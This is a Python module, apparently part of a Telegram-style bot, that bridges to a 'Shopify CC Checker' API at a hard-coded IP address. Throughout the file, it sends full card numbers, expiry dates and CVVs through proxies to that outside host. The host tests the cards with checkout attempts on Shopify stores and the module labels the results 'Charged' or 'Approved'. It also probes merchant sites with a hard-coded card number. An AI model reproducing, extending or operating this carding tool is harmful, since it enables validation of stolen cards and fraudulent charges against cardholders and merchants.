"""
checker_bridge.py — Shopify CC Checker API Bridge

New single-endpoint API: http://5.175.222.144:8081/
Request format: ?cc|mm|yy|cvv&proxy=host:port:user:pass
No site required. Auto-retry on all transient errors.
"""

import asyncio
import aiohttp
import json
import time
import logging
from urllib.parse import quote

log = logging.getLogger("checker_bridge")
log.setLevel(logging.DEBUG)

# ── API endpoint ──────────────────────────────────────────────────────────────
API_BASE = "http://5.175.222.144:8081"

# ── Timeouts ──────────────────────────────────────────────────────────────────
_REQUEST_TIMEOUT = 120
_CONNECT_TIMEOUT = 5

# ── Retry config ──────────────────────────────────────────────────────────────
_MAX_RETRIES = 15          # Retry up to 15 times on errors
_RETRY_DELAY = 1.5         # Seconds between retries

# ── Persistent aiohttp session ────────────────────────────────────────────────
_session: aiohttp.ClientSession | None = None

async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        conn = aiohttp.TCPConnector(
            limit=8000,
            limit_per_host=2000,
            ttl_dns_cache=300,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
        )
        _session = aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(
                total=_REQUEST_TIMEOUT,
                connect=_CONNECT_TIMEOUT,
            ),
        )
    return _session


# ── Proxy formatter (host:port:user:pass) ─────────────────────────────────────

def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
    if not proxy_data:
        return None
    # Prefer fully-built proxy_url from proxy.json
    existing = proxy_data.get("proxy_url")
    if existing and isinstance(existing, str) and existing.strip():
        from urllib.parse import urlparse
        parsed = urlparse(existing.strip())
        host = parsed.hostname
        port = parsed.port
        user = parsed.username
        pw = parsed.password
        if host and port:
            if user and pw:
                return f"{host}:{port}:{user}:{pw}"
            return f"{host}:{port}"
    ip = str(proxy_data.get("ip") or "").strip()
    port = str(proxy_data.get("port") or "").strip()
    user = proxy_data.get("username")
    pw = proxy_data.get("password")
    if not ip or not port:
        return None
    if user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    return f"{ip}:{port}"


# ── CC formatter (4-digit year → 2-digit year) ────────────────────────────────

def _format_cc_for_api(cc_str: str) -> str:
    """Convert cc|mm|yyyy|cvv → cc|mm|yy|cvv for the API."""
    parts = cc_str.split("|")
    if len(parts) >= 3:
        year = parts[2].strip()
        if len(year) == 4:
            parts[2] = year[2:]  # 2030 → 30
    return "|".join(parts[:4])


# ── Error detection ───────────────────────────────────────────────────────────

_ERROR_INDICATORS = (
    "error", "failed", "timeout", "connection", "unreachable",
    "refused", "reset", "closed", "unexpected", "unknown",
    "cloudflare", "could not resolve", "ssl", "tls",
    "empty reply", "bad gateway", "service unavailable",
    "gateway timeout", "network", "access denied",
    "503", "502", "504", "500", "429", "404",
    "no response", "invalid", "missing", "required",
    "all nodes failed", "site dead", "captcha_required",
)

_PROXY_BURNED_INDICATORS = (
    "proxy burned", "change your proxy", "proxy error",
    "authentication failed", "could not connect",
)

def _is_error_response(text: str) -> bool:
    """Return True if the response indicates a transient error (should retry)."""
    if not text or not text.strip():
        return True
    rl = text.lower()
    return any(k in rl for k in _ERROR_INDICATORS)


# ── API call with aggressive retry ────────────────────────────────────────────

async def _call_api(cc_str: str, proxy_str: str) -> dict:
    """
    Call the Shopify checker API.
    Retries on ANY error/exception until a clean response is received
    or _MAX_RETRIES is exhausted.
    """
    sess = await _get_session()
    cc_norm = _format_cc_for_api(cc_str)
    
    # Build URL exactly as requested: ?cc|mm|yy|cvv&proxy=host:port:user:pass
    url = f"{API_BASE}/?{cc_norm}&proxy={quote(proxy_str, safe='|:')}"
    
    last_error = "Unknown error"
    
    for attempt in range(1, _MAX_RETRIES + 1):
        t0 = time.monotonic()
        try:
            log.debug(f"[api] attempt {attempt}/{_MAX_RETRIES} | cc=...{cc_norm.split('|')[0][-4:]} | proxy={proxy_str[:30]}...")
            
            async with sess.get(
                url,
                timeout=aiohttp.ClientTimeout(total=_REQUEST_TIMEOUT, connect=_CONNECT_TIMEOUT),
            ) as resp:
                text = await resp.text()
                
                # Try JSON parse
                try:
                    parsed = json.loads(text)
                    if isinstance(parsed, dict):
                        data = parsed
                    else:
                        data = {"_raw_text": text}
                except Exception:
                    data = {"_raw_text": text}
                
                elapsed = (time.monotonic() - t0) * 1000
                
                # Extract response string for checking
                if isinstance(data, dict):
                    resp_text = str(data.get("response", data.get("Response", data.get("status", data.get("message", data.get("_raw_text", ""))))))
                else:
                    resp_text = text
                
                resp_lower = resp_text.lower()
                
                # Proxy burned → don't retry, return immediately
                if any(ind in resp_lower for ind in _PROXY_BURNED_INDICATORS):
                    log.warning(f"[api] proxy burned on attempt {attempt}")
                    return data
                
                # Success: HTTP 200 and no error keywords
                if resp.status == 200 and not _is_error_response(resp_text):
                    log.debug(f"[api] ✓ attempt {attempt} | {elapsed:.0f}ms | resp={resp_text[:60]}")
                    return data
                
                # Transient error → retry
                last_error = f"HTTP {resp.status} | {resp_text[:80]}"
                log.warning(f"[api] error attempt {attempt} | {last_error}")
                
        except (asyncio.TimeoutError, TimeoutError) as e:
            last_error = f"Timeout: {e}"
            log.warning(f"[api] timeout attempt {attempt} | {e}")
        except Exception as e:
            last_error = f"{type(e).__name__}: {e}"
            log.warning(f"[api] exception attempt {attempt} | {last_error}")
        
        if attempt < _MAX_RETRIES:
            await asyncio.sleep(_RETRY_DELAY)
    
    raise RuntimeError(f"API failed after {_MAX_RETRIES} attempts: {last_error}")


# ── Result normalisation ──────────────────────────────────────────────────────

def _map_result(raw: dict | str, cc_str: str, site_url: str) -> dict:
    if isinstance(raw, dict):
        response = (
            raw.get("Response") 
            or raw.get("response") 
            or raw.get("status") 
            or raw.get("message") 
            or raw.get("_raw_text")
            or "Unknown"
        )
        price = (
            raw.get("Price") 
            or raw.get("price") 
            or raw.get("amount") 
            or "-"
        )
        gate = (
            raw.get("Gate") 
            or raw.get("gate") 
            or "Shopify"
        )
    else:
        response = str(raw) if raw else "Unknown"
        price = "-"
        gate = "Shopify"

    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "💎" in response:
        status = "Charged"
    elif any(k in rl for k in [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "invalid_cvc", "incorrect_cvc",
        "incorrect_zip", "insufficient funds",
    ]):
        status = "Approved"
    else:
        status = response

    result = {
        "Response": response,
        "Price": price,
        "Gate": gate,
        "Status": status,
        "CC": raw.get("CC", cc_str) if isinstance(raw, dict) else cc_str,
        "Site": raw.get("Site", site_url) if isinstance(raw, dict) else site_url,
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        result["Price"] = f"${p}"
    return result


# ── Dead-response detection ───────────────────────────────────────────────────

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'cloudflare', 'connection failed',
    'timed out', 'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'http error', 'timeout', 'unreachable',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'http 404', 'url rejected', 'malformed input',
    'amount_too_small', 'site dead', 'captcha_required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'all nodes failed',
)

def _is_dead(response_text: str) -> bool:
    if not response_text:
        return True
    rl = response_text.lower()
    return any(ind in rl for ind in _DEAD_INDICATORS)


# ── Public API ────────────────────────────────────────────────────────────────

async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -> dict:
    """
    Main async entry point called by bot.py for every CC check.
    Uses the new single-endpoint API with auto-retry on all errors.
    """
    _ensure_health_loop()

    proxy_str = _proxy_data_to_proxy_str(proxy_data)
    if not proxy_str:
        return {
            "Response": "No proxy – add one with /addpxy",
            "Price": "-", "Gate": "-", "Status": "No proxy",
            "CC": cc_str, "Site": site_url,
        }

    if site_url and not site_url.startswith("http"):
        site_url = f"https://{site_url}"
    site_url = (site_url or "").rstrip("/")

    t_start = time.monotonic()
    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]

    log.info(f"[bridge] check_card_site | cc=...{cc4} | proxy={proxy_str[:25]}...")

    try:
        raw = await _call_api(cc_str, proxy_str)
        result = _map_result(raw, cc_str, site_url)
        log.info(
            f"[bridge] done | {(time.monotonic()-t_start)*1000:.0f}ms"
            f" | status={result.get('Status')} | resp={result.get('Response','')[:60]}"
        )
        
        resp_l = result.get("Response", "").lower()
        if any(ind in resp_l for ind in _PROXY_BURNED_INDICATORS):
            return {
                "Response": "Proxy burned - change your proxy",
                "Price": "-", "Gate": "Shopify", "Status": "Error",
                "CC": cc_str, "Site": site_url,
            }
        return result
        
    except Exception as e:
        err_str = str(e)[:120]
        log.error(f"[bridge] all retries failed | {err_str}")
        
        err_l = err_str.lower()
        if any(ind in err_l for ind in _PROXY_BURNED_INDICATORS):
            final_resp = "Proxy burned - change your proxy"
        else:
            final_resp = f"API Error: {err_str}"

        return {
            "Response": final_resp,
            "Price": "-", "Gate": "-", "Status": "Error",
            "CC": cc_str, "Site": site_url,
        }


async def test_site(
    site_url:   str,
    proxy_data: dict | None,
    test_card:  str = "4031630422575208|01|2030|280",
) -> dict:
    raw = await check_card_site(test_card, site_url, proxy_data)
    response_text = raw.get("Response", "")
    price = raw.get("Price", "-")
    status = "working"
    if "proxy dead" in response_text.lower():
        status = "proxy_dead"
    elif _is_dead(response_text):
        status = "dead"
    return {"status": status, "response": response_text, "site": site_url, "price": price}


# ── Background health pinger (legacy compat) ──────────────────────────────────

_HEALTH_PING_INTERVAL = 15
_health_task: asyncio.Task | None = None

async def _health_loop() -> None:
    while True:
        await asyncio.sleep(_HEALTH_PING_INTERVAL)
        try:
            sess = await _get_session()
            async with sess.get(
                f"{API_BASE}/health",
                timeout=aiohttp.ClientTimeout(total=6, connect=4),
            ) as r:
                pass
        except Exception:
            pass

def _ensure_health_loop() -> None:
    global _health_task
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running() and (_health_task is None or _health_task.done()):
            _health_task = loop.create_task(_health_loop())
    except Exception:
        pass


# ── /api management helpers (used by bot.py) ──────────────────────────────────

def get_all_nodes() -> list[str]:
    """Return the API endpoint (legacy compat)."""
    return [API_BASE]


async def check_node_health(node: str) -> bool:
    """Ping the API endpoint. Returns True if alive."""
    try:
        sess = await _get_session()
        async with sess.get(
            f"{API_BASE}/health",
            timeout=aiohttp.ClientTimeout(total=6, connect=4),
        ) as r:
            return r.status == 200
    except Exception:
        return False


def is_node_disabled(node: str) -> bool:
    return False


def disable_node(node: str) -> None:
    log.info(f"[api] node DISABLED: {node}")


def enable_node(node: str) -> None:
    log.info(f"[api] node ENABLED: {node}")
